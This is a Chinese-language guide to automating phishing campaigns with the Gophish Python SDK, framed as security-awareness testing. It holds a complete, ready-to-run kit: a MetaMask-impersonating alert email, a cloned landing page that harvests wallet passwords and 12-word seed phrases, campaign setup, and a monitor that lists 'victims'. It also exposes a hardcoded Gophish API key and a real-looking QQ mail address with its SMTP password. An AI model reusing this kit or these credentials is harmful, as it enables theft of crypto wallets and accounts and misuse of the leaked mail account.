# 🐍 Python SDK API调用指南

## 📋 概述

本文档详细说明如何使用Python SDK调用Gophish API和系统各个组件的接口，实现完全自动化的钓鱼实验管理。

---

## 🔧 环境准备

### 安装依赖
```bash
conda activate gophish-test
pip install gophish requests flask python-jose
```

### 基础配置
```python
# config.py
GOPHISH_API_KEY = "a78b08ef30d9dc06074a49d155ff14f7d586d65007702a9c4170384d9c00d588"
GOPHISH_HOST = "https://localhost:3333"
DASHBOARD_HOST = "http://localhost:6789"
```

---

## 🎣 Gophish API 调用

### 基础连接
```python
from gophish import Gophish
from gophish.models import *
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 初始化API客户端
api = Gophish(GOPHISH_API_KEY, host=GOPHISH_HOST, verify=False)

# 测试连接
try:
    campaigns = api.campaigns.get()
    print(f"✅ 连接成功，当前有{len(campaigns)}个活动")
except Exception as e:
    print(f"❌ 连接失败: {e}")
```

### 1. 用户组管理
```python
def create_user_group(name: str, users: list):
    """创建用户组"""
    targets = []
    for user in users:
        target = User(
            first_name=user.get('first_name', ''),
            last_name=user.get('last_name', ''),
            email=user['email'],
            position=user.get('position', '')
        )
        targets.append(target)
    
    group = Group(name=name, targets=targets)
    
    try:
        result = api.groups.post(group)
        print(f"✅ 用户组创建成功: {result.name} (ID: {result.id})")
        return result
    except Exception as e:
        print(f"❌ 用户组创建失败: {e}")
        return None

# 使用示例
test_users = [
    {
        'first_name': '张',
        'last_name': '三',
        'email': 'zhangsan@company.com',
        'position': '软件工程师'
    },
    {
        'first_name': '李',
        'last_name': '四', 
        'email': 'lisi@company.com',
        'position': '产品经理'
    }
]

group = create_user_group("Python SDK测试组", test_users)
```

### 2. 邮件模板管理
```python
def create_email_template(name: str, subject: str, html: str, text: str = ""):
    """创建邮件模板"""
    template = Template(
        name=name,
        subject=subject,
        html=html,
        text=text or "请查看HTML版本邮件"
    )
    
    try:
        result = api.templates.post(template)
        print(f"✅ 邮件模板创建成功: {result.name} (ID: {result.id})")
        return result
    except Exception as e:
        print(f"❌ 邮件模板创建失败: {e}")
        return None

# 使用示例 - 创建MetaMask钓鱼邮件
metamask_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>MetaMask Security Alert</title>
</head>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="background: #f6851b; color: white; padding: 20px; text-align: center;">
        <h1>🦊 MetaMask Security Alert</h1>
    </div>
    <div style="padding: 20px;">
        <p>Dear MetaMask User,</p>
        <p>We have detected suspicious activity on your wallet that requires immediate attention.</p>
        <p><strong>⚠️ Action Required Within 24 Hours</strong></p>
        <p>Click the button below to verify your wallet security:</p>
        <div style="text-align: center; margin: 30px 0;">
            <a href="{{.URL}}" style="background: #f6851b; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block;">
                🔐 Verify Your Wallet
            </a>
        </div>
        <p>If you do not take action, your wallet may be temporarily restricted.</p>
        <p>Best regards,<br>The MetaMask Security Team</p>
    </div>
</body>
</html>
"""

template = create_email_template(
    name="SDK_MetaMask安全警告",
    subject="🚨 MetaMask Security Alert - Immediate Action Required",
    html=metamask_html
)
```

### 3. 钓鱼页面管理
```python
def create_landing_page(name: str, html: str):
    """创建钓鱼页面"""
    page = Page(
        name=name,
        html=html,
        capture_credentials=True,
        capture_passwords=True,
        redirect_url=""
    )
    
    try:
        result = api.pages.post(page)
        print(f"✅ 钓鱼页面创建成功: {result.name} (ID: {result.id})")
        return result
    except Exception as e:
        print(f"❌ 钓鱼页面创建失败: {e}")
        return None

# 使用示例 - 创建高级钓鱼页面
advanced_phishing_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>MetaMask - Connect Your Wallet</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; border-radius: 10px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(45deg, #f6851b, #e2761b); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
        input:focus { border-color: #f6851b; outline: none; }
        .btn { width: 100%; padding: 15px; background: #f6851b; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #e2761b; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .footer { text-align: center; padding: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    {{.Tracker}}
    <div class="container">
        <div class="header">
            <h1>🦊 MetaMask</h1>
            <p>Secure Wallet Verification</p>
        </div>
        <div class="content">
            <div class="warning">
                ⚠️ <strong>Security Alert:</strong> Unusual activity detected. Please verify your wallet immediately.
            </div>
            
            <form method="post" id="phishingForm">
                <div class="form-group">
                    <label>Email Address:</label>
                    <input type="email" name="email" required placeholder="Enter your email">
                </div>
                <div class="form-group">
                    <label>Wallet Password:</label>
                    <input type="password" name="password" required placeholder="Enter your wallet password">
                </div>
                <div class="form-group">
                    <label>Seed Phrase (12 words):</label>
                    <input type="text" name="seed_phrase" required placeholder="Enter your 12-word seed phrase">
                </div>
                <button type="submit" class="btn">🔐 Verify Wallet Security</button>
            </form>
        </div>
        <div class="footer">
            <p>🔒 Your security is our priority</p>
        </div>
    </div>
    
    <script>
        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // 显示加载效果
            const btn = document.querySelector('.btn');
            btn.innerHTML = '🔄 Verifying...';
            btn.disabled = true;
            
            // 收集表单数据
            const formData = new FormData(this);
            
            // 提交数据到后端
            fetch('', {
                method: 'POST',
                body: formData
            }).then(() => {
                // 模拟验证过程
                setTimeout(() => {
                    // 展示"危害效果" - 这里会进行浏览器攻击演示
                    showAttackDemo();
                }, 2000);
            });
        });
        
        function showAttackDemo() {
            // 1. 标签页劫持演示
            document.title = "⚠️ WALLET COMPROMISED";
            
            // 2. 模拟Cookie窃取
            console.log("🍪 Cookies stolen:", document.cookie);
            
            // 3. 显示攻击成功页面
            document.body.innerHTML = `
                <div style="background: #ff4444; color: white; padding: 50px; text-align: center; font-family: Arial;">
                    <h1>🚨 SECURITY DEMONSTRATION</h1>
                    <h2>Your wallet credentials have been captured!</h2>
                    <div style="background: rgba(0,0,0,0.3); padding: 20px; margin: 20px 0; border-radius: 10px;">
                        <h3>Captured Data:</h3>
                        <p>✅ Email Address</p>
                        <p>✅ Wallet Password</p>
                        <p>✅ Seed Phrase (12 words)</p>
                        <p>✅ Browser Cookies</p>
                        <p>✅ Session Tokens</p>
                    </div>
                    <p style="font-size: 18px;">This is a security awareness demonstration.</p>
                    <p>In a real attack, your wallet would now be compromised.</p>
                    <button onclick="window.close()" style="padding: 15px 30px; font-size: 16px; background: white; color: #ff4444; border: none; border-radius: 5px; cursor: pointer;">
                        Close Window
                    </button>
                </div>
            `;
            
            // 4. 可选：打开新标签页展示进一步的攻击
            setTimeout(() => {
                window.open('http://localhost:5001', '_blank');
            }, 3000);
        }
    </script>
</body>
</html>
"""

page = create_landing_page("SDK_高级MetaMask钓鱼页面", advanced_phishing_html)
```

### 4. SMTP配置
```python
def create_smtp_profile(name: str, host: str, username: str, password: str, from_address: str):
    """创建SMTP配置"""
    smtp = SMTP(
        name=name,
        host=host,
        from_address=from_address,
        username=username,
        password=password,
        ignore_cert_errors=True,
        interface_type="SMTP"
    )
    
    try:
        result = api.smtp.post(smtp)
        print(f"✅ SMTP配置创建成功: {result.name} (ID: {result.id})")
        return result
    except Exception as e:
        print(f"❌ SMTP配置创建失败: {e}")
        return None

# 使用示例
smtp = create_smtp_profile(
    name="SDK_QQ邮箱",
    host="smtp.qq.com:465",
    username="809050685@qq.com",
    password="xutqpejdkpfcbbhi",
    from_address="MetaMask Security <809050685@qq.com>"
)
```

### 5. 钓鱼活动管理
```python
def create_campaign(name: str, group_name: str, template_name: str, page_name: str, smtp_name: str, url: str):
    """创建钓鱼活动"""
    campaign = Campaign(
        name=name,
        groups=[Group(name=group_name)],
        template=Template(name=template_name),
        page=Page(name=page_name),
        smtp=SMTP(name=smtp_name),
        url=url
    )
    
    try:
        result = api.campaigns.post(campaign)
        print(f"✅ 钓鱼活动创建成功: {result.name} (ID: {result.id})")
        print(f"📊 状态: {result.status}")
        return result
    except Exception as e:
        print(f"❌ 钓鱼活动创建失败: {e}")
        return None

# 使用示例 - 创建完整的MetaMask钓鱼活动
campaign = create_campaign(
    name="SDK_MetaMask钓鱼演示",
    group_name="Python SDK测试组",
    template_name="SDK_MetaMask安全警告",
    page_name="SDK_高级MetaMask钓鱼页面",
    smtp_name="SDK_QQ邮箱",
    url="http://localhost:5001"  # 重定向到XSS服务器
)
```

### 6. 结果监控
```python
def get_campaign_results(campaign_id: int = None):
    """获取活动结果"""
    try:
        if campaign_id:
            campaign = api.campaigns.get(campaign_id)
            campaigns = [campaign]
        else:
            campaigns = api.campaigns.get()
        
        for campaign in campaigns:
            print(f"\n📊 活动: {campaign.name} (ID: {campaign.id})")
            print(f"状态: {campaign.status}")
            print(f"创建时间: {campaign.created_date}")
            
            total = len(campaign.results)
            sent = len([r for r in campaign.results if r.status in ['Email Sent', 'Clicked Link', 'Submitted Data']])
            clicked = len([r for r in campaign.results if r.status in ['Clicked Link', 'Submitted Data']])
            submitted = len([r for r in campaign.results if r.status == 'Submitted Data'])
            
            print(f"📈 统计:")
            print(f"  总用户: {total}")
            print(f"  邮件发送: {sent}")
            print(f"  链接点击: {clicked}")
            print(f"  数据提交: {submitted}")
            print(f"  点击率: {round(clicked/sent*100, 2) if sent > 0 else 0}%")
            print(f"  提交率: {round(submitted/sent*100, 2) if sent > 0 else 0}%")
            
            # 显示详细结果
            for result in campaign.results:
                print(f"  👤 {result.first_name} {result.last_name} ({result.email}): {result.status}")
    
    except Exception as e:
        print(f"❌ 获取结果失败: {e}")

# 使用示例
get_campaign_results()  # 获取所有活动结果
```

---

## 🎛️ Dashboard API 调用

### 基础API调用
```python
import requests
import json

def call_dashboard_api(endpoint: str, method: str = 'GET', data: dict = None):
    """调用Dashboard API"""
    url = f"{DASHBOARD_HOST}{endpoint}"
    
    try:
        if method == 'GET':
            response = requests.get(url)
        elif method == 'POST':
            response = requests.post(url, data=data)
        
        if response.status_code == 200:
            return response.json()
        else:
            print(f"❌ API调用失败: {response.status_code}")
            return None
    except Exception as e:
        print(f"❌ 请求失败: {e}")
        return None
```

### 系统状态检查
```python
def check_system_status():
    """检查系统状态"""
    status = call_dashboard_api('/api/status')
    if status:
        print(f"🎣 Gophish: {'在线' if status['gophish'] else '离线'}")
        print(f"🤖 AI生成器: {'就绪' if status['ai_ready'] else '错误'}")
        print(f"📊 活跃活动: {status['active_campaigns']}")
        print(f"📧 邮件模板: {status['total_templates']}")
        print(f"👥 用户组: {status['total_groups']}")
        
        print("\n🌐 攻击服务器状态:")
        for server, status_info in status['services'].items():
            print(f"  {server}: {'🟢' if status_info == 'online' else '🔴'}")

# 使用示例
check_system_status()
```

### AI内容生成
```python
def generate_ai_content(content_type: str, scenario_type: str, company_name: str, use_real_template: bool = False):
    """生成AI内容"""
    data = {
        'content_type': content_type,  # 'email' 或 'page'
        'scenario_type': scenario_type,  # 'security_alert', 'system_update', 等
        'company_name': company_name,
        'use_real_template': 'true' if use_real_template else 'false'
    }
    
    if content_type == 'page':
        data['page_type'] = 'login'
        data['style'] = 'corporate'
    
    result = call_dashboard_api('/generate_content', 'POST', data)
    if result and result['success']:
        print(f"✅ {content_type}生成成功: {result['message']}")
        return result
    else:
        print(f"❌ 生成失败: {result['message'] if result else 'Unknown error'}")
        return None

# 使用示例
email_result = generate_ai_content('email', 'security_alert', 'MetaMask', True)
page_result = generate_ai_content('page', 'login', 'MetaMask')
```

### 批量操作
```python
def batch_operation(operation: str, **kwargs):
    """执行批量操作"""
    data = {'operation': operation}
    data.update(kwargs)
    
    result = call_dashboard_api('/batch_operation', 'POST', data)
    if result and result['success']:
        print(f"✅ 批量操作成功: {result['message']}")
        return result
    else:
        print(f"❌ 批量操作失败: {result['message'] if result else 'Unknown error'}")
        return None

# 使用示例
# 创建演示环境
batch_operation('create_demo_environment')

# 批量生成模板
batch_operation('generate_multiple_templates', count=5)
```

---

## 🚀 完整自动化脚本

### 一键创建MetaMask钓鱼活动
```python
#!/usr/bin/env python3
"""
一键创建MetaMask钓鱼活动的完整脚本
"""

from gophish import Gophish
from gophish.models import *
import urllib3
import time

# 配置
GOPHISH_API_KEY = "a78b08ef30d9dc06074a49d155ff14f7d586d65007702a9c4170384d9c00d588"
GOPHISH_HOST = "https://localhost:3333"

def main():
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # 初始化API
    api = Gophish(GOPHISH_API_KEY, host=GOPHISH_HOST, verify=False)
    
    print("🎯 开始创建MetaMask钓鱼活动...")
    
    # 1. 创建用户组
    print("\n1️⃣ 创建测试用户组...")
    users = [
        {'first_name': '测试', 'last_name': '用户1', 'email': 'test1@company.com', 'position': '开发者'},
        {'first_name': '测试', 'last_name': '用户2', 'email': 'test2@company.com', 'position': '设计师'},
        {'first_name': '测试', 'last_name': '用户3', 'email': 'test3@company.com', 'position': '产品经理'}
    ]
    
    targets = [User(first_name=u['first_name'], last_name=u['last_name'], 
                   email=u['email'], position=u['position']) for u in users]
    group = api.groups.post(Group(name="SDK_MetaMask测试组", targets=targets))
    print(f"✅ 用户组创建成功: {group.name}")
    
    # 2. 创建SMTP配置
    print("\n2️⃣ 创建SMTP配置...")
    smtp = api.smtp.post(SMTP(
        name="SDK_MetaMask_SMTP",
        host="smtp.qq.com:465",
        from_address="MetaMask Security <809050685@qq.com>",
        username="809050685@qq.com",
        password="xutqpejdkpfcbbhi",
        ignore_cert_errors=True,
        interface_type="SMTP"
    ))
    print(f"✅ SMTP配置成功: {smtp.name}")
    
    # 3. 创建邮件模板（这里使用前面定义的HTML）
    print("\n3️⃣ 创建邮件模板...")
    template = api.templates.post(Template(
        name="SDK_MetaMask高级钓鱼邮件",
        subject="🚨 MetaMask Security Alert - Immediate Action Required",
        html=metamask_html,  # 使用前面定义的HTML
        text="请查看HTML版本邮件以完成钱包验证"
    ))
    print(f"✅ 邮件模板创建成功: {template.name}")
    
    # 4. 创建钓鱼页面（使用前面定义的高级页面）
    print("\n4️⃣ 创建钓鱼页面...")
    page = api.pages.post(Page(
        name="SDK_MetaMask高级钓鱼页面",
        html=advanced_phishing_html,  # 使用前面定义的HTML
        capture_credentials=True,
        capture_passwords=True
    ))
    print(f"✅ 钓鱼页面创建成功: {page.name}")
    
    # 5. 创建钓鱼活动
    print("\n5️⃣ 创建钓鱼活动...")
    timestamp = int(time.time())
    campaign = api.campaigns.post(Campaign(
        name=f"SDK_MetaMask钓鱼演示_{timestamp}",
        groups=[Group(name=group.name)],
        template=Template(name=template.name),
        page=Page(name=page.name),
        smtp=SMTP(name=smtp.name),
        url="http://localhost:5001"  # 指向XSS服务器
    ))
    print(f"✅ 钓鱼活动创建成功: {campaign.name}")
    print(f"📊 活动ID: {campaign.id}")
    print(f"🌐 钓鱼URL: http://localhost:5001")
    
    print("\n🎉 MetaMask钓鱼活动创建完成！")
    print(f"📍 管理界面: https://localhost:3333")
    print(f"📊 损失评估: http://localhost:5888")

if __name__ == "__main__":
    main()
```

### 运行脚本
```bash
# 保存为 create_metamask_phishing.py
conda activate gophish-test
python create_metamask_phishing.py
```

---

## 📊 高级监控脚本

```python
#!/usr/bin/env python3
"""
实时监控钓鱼活动的高级脚本
"""

import time
import json
from datetime import datetime
from gophish import Gophish

def monitor_campaigns():
    """实时监控所有钓鱼活动"""
    api = Gophish(GOPHISH_API_KEY, host=GOPHISH_HOST, verify=False)
    
    print("🔍 开始实时监控钓鱼活动...")
    print("按 Ctrl+C 停止监控\n")
    
    try:
        while True:
            campaigns = api.campaigns.get()
            
            print(f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("=" * 60)
            
            for campaign in campaigns:
                total = len(campaign.results)
                clicked = len([r for r in campaign.results if r.status in ['Clicked Link', 'Submitted Data']])
                submitted = len([r for r in campaign.results if r.status == 'Submitted Data'])
                
                print(f"🎯 {campaign.name}")
                print(f"   状态: {campaign.status}")
                print(f"   统计: {total}人 | {clicked}点击 | {submitted}提交")
                print(f"   成功率: {round(submitted/total*100, 2) if total > 0 else 0}%")
                
                # 显示最新的受害者
                recent_victims = [r for r in campaign.results if r.status == 'Submitted Data']
                if recent_victims:
                    print(f"   🎣 最新受害者: {recent_victims[-1].email}")
            
            time.sleep(30)  # 每30秒刷新一次
            
    except KeyboardInterrupt:
        print("\n\n👋 监控已停止")

if __name__ == "__main__":
    monitor_campaigns()
```

---

## 🔧 实用工具函数

```python
def cleanup_old_campaigns():
    """清理旧的测试活动"""
    api = Gophish(GOPHISH_API_KEY, host=GOPHISH_HOST, verify=False)
    
    campaigns = api.campaigns.get()
    for campaign in campaigns:
        if "SDK_" in campaign.name or "测试" in campaign.name:
            api.campaigns.delete(campaign.id)
            print(f"🗑️ 删除测试活动: {campaign.name}")

def export_results_to_json(campaign_id: int, filename: str):
    """导出活动结果到JSON文件"""
    api = Gophish(GOPHISH_API_KEY, host=GOPHISH_HOST, verify=False)
    
    campaign = api.campaigns.get(campaign_id)
    
    results = {
        'campaign_name': campaign.name,
        'status': campaign.status,
        'created_date': str(campaign.created_date),
        'results': []
    }
    
    for result in campaign.results:
        results['results'].append({
            'email': result.email,
            'name': f"{result.first_name} {result.last_name}",
            'status': result.status,
            'ip': result.ip,
            'user_agent': result.user_agent,
            'submitted_data': result.submitted_data
        })
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    
    print(f"📄 结果已导出到: {filename}")

# 使用示例
# cleanup_old_campaigns()
# export_results_to_json(1, "metamask_phishing_results.json")
```

---

## 🎯 总结

通过Python SDK，您可以：

1. **完全自动化**钓鱼实验的创建和管理
2. **批量操作**大规模的安全意识测试
3. **实时监控**攻击效果和用户行为
4. **数据分析**详细的钓鱼成功率统计
5. **集成开发**将钓鱼测试集成到现有系统中

**🚀 立即开始使用Python SDK进行高级钓鱼安全测试！**
